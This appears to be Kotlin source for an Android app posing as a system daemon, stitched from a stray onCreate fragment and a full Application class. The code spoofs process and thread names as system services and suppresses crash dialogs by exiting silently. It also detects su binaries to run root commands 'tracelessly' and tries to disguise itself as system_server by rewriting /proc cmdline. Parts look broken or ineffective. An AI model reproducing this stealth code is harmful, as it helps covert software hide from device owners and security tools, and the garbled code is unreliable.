override fun onCreate() {
    super.onCreate()

    // 全局崩溃兜底，杜绝系统弹出屡次停止弹窗
    Thread.setDefaultUncaughtExceptionHandler { _, _ ->
        // 静默崩溃，直接退出不弹窗
        System.exit(0)
    }

    // 后续原有隐藏、SU、JNI初始化逻辑，全部延后异步执行
    Handler(Looper.getMainLooper()).postIdle {
        initBackgroundCoreLogic()
    }
}
package com.android.system.daemon

import android.app.Application
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.os.Process
import androidx.appcompat.app.AlertDialog
import java.io.DataOutputStream
import java.util.Random

class App : Application() {

    private val procPool = listOf(
        "system_service",
        "media_daemon",
        "wifi_service",
        "cloud_service",
        "log_daemon"
    )

    private val threadPool = listOf(
        "system_io",
        "system_work",
        "net_service",
        "dev_monitor"
    )

    // 自定义SU命令，留空=自动识别
    var customSuCmd: String = ""

    // JNI 绑定 libsilent_core.so
    external fun silentCoreInit(): Int
    external fun getCoreStatus(): String

    override fun onCreate() {
        super.onCreate()
        hideAllTrace()
        autoDetectSu()

        Handler(Looper.getMainLooper()).post {
            checkRootPermission()
            checkSilentCoreSo()
        }
    }

    // 自动识别 SU
    private fun autoDetectSu() {
        if (customSuCmd.isNotBlank()) return
        val suList = listOf("su", "su -c", "/system/bin/su", "/sbin/su", "magisk su", "ksu su")
        for (cmd in suList) {
            if (testSu(cmd)) {
                customSuCmd = cmd
                break
            }
        }
    }

    private fun testSu(su: String): Boolean {
        return try {
            val p = Runtime.getRuntime().exec("$su id")
            p.waitFor()
            p.exitValue() == 0
        } catch (_: Exception) {
            false
        }
    }

    // Root 检测弹窗
    private fun checkRootPermission() {
        val hasRoot = checkRoot()
        AlertDialog.Builder(this@App)
            .setTitle("Root 权限检测")
            .setMessage(
                if (hasRoot) "✅ 已获取 Root 权限\n当前SU：$customSuCmd\n无痕模式已启用"
                else "❌ 未获取 Root 权限\n高级文件功能受限"
            )
            .setPositiveButton("确定", null)
            .show()
    }

    private fun checkRoot(): Boolean {
        return try {
            val p = Runtime.getRuntime().exec("$customSuCmd id")
            p.waitFor()
            p.exitValue() == 0
        } catch (_: Exception) {
            false
        }
    }

    // 检测 libsilent_core.so
    private fun checkSilentCoreSo() {
        try {
            System.loadLibrary("silent_core")
            val code = silentCoreInit()
            val status = getCoreStatus()
            AlertDialog.Builder(this@App)
                .setTitle("静默核心检测")
                .setMessage("✅ libsilent_core.so 加载成功\n运行状态：$status\n初始化码：$code")
                .setPositiveButton("确定", null)
                .show()
        } catch (e: Throwable) {
            AlertDialog.Builder(this@App)
                .setTitle("静默核心检测")
                .setMessage("❌ libsilent_core.so 缺失或加载失败")
                .setPositiveButton("确定", null)
                .show()
        }
    }

    // 进程、应用隐藏
    private fun hideAllTrace() {
        try {
            val method = Process::class.java.getDeclaredMethod("setArgV0", String::class.java)
            method.isAccessible = true
            method.invoke(null, procPool.random())
        } catch (_: Throwable) {}

        Thread.currentThread().name = threadPool.random()

        try {
            val pm: PackageManager = packageManager
            val info = pm.getApplicationInfo(packageName, 0)
            info.enabled = true
        } catch (_: Throwable) {}
    }

    // 无痕执行 SU 命令
    fun execSu(cmd: String): Boolean {
        if (customSuCmd.isBlank()) return false
        return try {
            val su = Runtime.getRuntime().exec(customSuCmd)
            val dos = DataOutputStream(su.outputStream)
            dos.writeBytes("$cmd\n")
            dos.writeBytes("exit\n")
            dos.flush()
            dos.close()
            su.destroy()
            true
        } catch (_: Exception) {
            false
        }
    }

    // 隐藏自身进程
    fun hideSelfProcess() {
        if (!checkRoot()) return
        val pid = Process.myPid()
        val hideCmd = "mv /proc/$pid/cmdline /proc/$pid/cmdline_bak;echo system_server > /proc/$pid/cmdline"
        execSu(hideCmd)
    }
}
